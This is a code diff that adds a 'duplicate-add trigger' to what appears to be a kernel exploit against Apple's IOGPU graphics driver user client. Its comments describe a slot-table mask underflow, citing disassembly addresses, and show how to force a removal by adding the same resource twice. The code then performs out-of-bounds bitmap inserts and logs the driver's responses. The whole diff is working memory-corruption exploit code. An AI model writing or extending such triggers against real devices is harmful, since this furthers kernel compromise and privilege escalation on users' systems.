@@ -468,6 +468,63 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] remove-path trigger done");
     }
 
+
+    if (trigger == 4) {
+        /* DUPLICATE ADD = THE REMOVE PATH.
+         *
+         * The slot table's mask lives at +0x30 and is decremented on every
+         * removal (0x9f51914 ldr w9,[x0,#48] / 0x9f51918 sub w9,w9,#1 /
+         * 0x9f5191c str w9,[x0,#48]). A group with capacity 64 starts with
+         * MASK = (64>>6)-1 = 0, so ONE removal turns the mask into
+         * 0xffffffff and the next insert indexes the bitmap unmasked.
+         *
+         * No command removes a resource by its global id - the probe of all
+         * 256 commands found none (remove candidate cmd=4294967295). But
+         * adding the SAME resource twice forces the insert path to drop the
+         * old entry first, and that drop is the removal.
+         */
+        ol("[grp] === DUPLICATE-ADD TRIGGER ===");
+        static uint8_t o4[0x200];
+        size_t on4 = 0;
+        int k4 = call_sel(conn, CMD_NEW_GROUP, 64, surf_id, 0, 0, o4, &on4);
+        uint64_t grp4 = 0;
+        if (k4 == 0) memcpy(&grp4, o4 + 0x10, 8);
+        ol("[grp] group -> kr=0x%x grp=0x%016llx", k4, (unsigned long long)grp4);
+        if (k4 != 0) { ol("[grp] no group"); return; }
+
+        for (uint32_t i = 0; i < nsurf; i++) {
+            ol("[grp] add #1 surf_id=%u", surf_ids[i]);
+            int a1 = call_sel(conn, CMD_ADD_RES, surf_ids[i], 1, 0, 0, o4, &on4);
+            ol("[grp] add #1 surf_id=%u -> kr=0x%x", surf_ids[i], a1);
+            if (a1 != 0) break;
+
+            ol("[grp] add #2 (same id - this drops the old entry) surf_id=%u", surf_ids[i]);
+            int a2 = call_sel(conn, CMD_ADD_RES, surf_ids[i], 1, 0, 0, o4, &on4);
+            ol("[grp] add #2 surf_id=%u -> kr=0x%x  (mask is now 0xffffffff)", surf_ids[i], a2);
+            if (a2 == (int)0x10000003) {
+                ol("[grp] client died on the duplicate add - the mask was already "
+                   "underflowed and the bitmap access went out of bounds");
+                break;
+            }
+            if (a2 != 0) { ol("[grp] duplicate refused (kr=0x%x) - this path is closed", a2); break; }
+
+            ol("[grp] OOB add: fresh resources with the underflowed mask");
+            for (uint32_t j = 0; j < nsurf; j++) {
+                if (j == i) continue;
+                ol("[grp] OOB add surf_id=%u", surf_ids[j]);
+                int ke = call_sel(conn, CMD_ADD_RES, surf_ids[j], 1, 0, 0, o4, &on4);
+                ol("[grp] OOB add surf_id=%u -> kr=0x%x", surf_ids[j], ke);
+                if (ke == (int)0x10000003) {
+                    ol("[grp] client died (INVALID_DEST) - the out-of-bounds "
+                       "bitmap access already hit unmapped memory");
+                    break;
+                }
+            }
+            break;
+        }
+        ol("[grp] duplicate-add trigger done");
+    }
+
     if (trigger == 1) {
         /* DIRECT GROW on a FRESH connection.
            0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
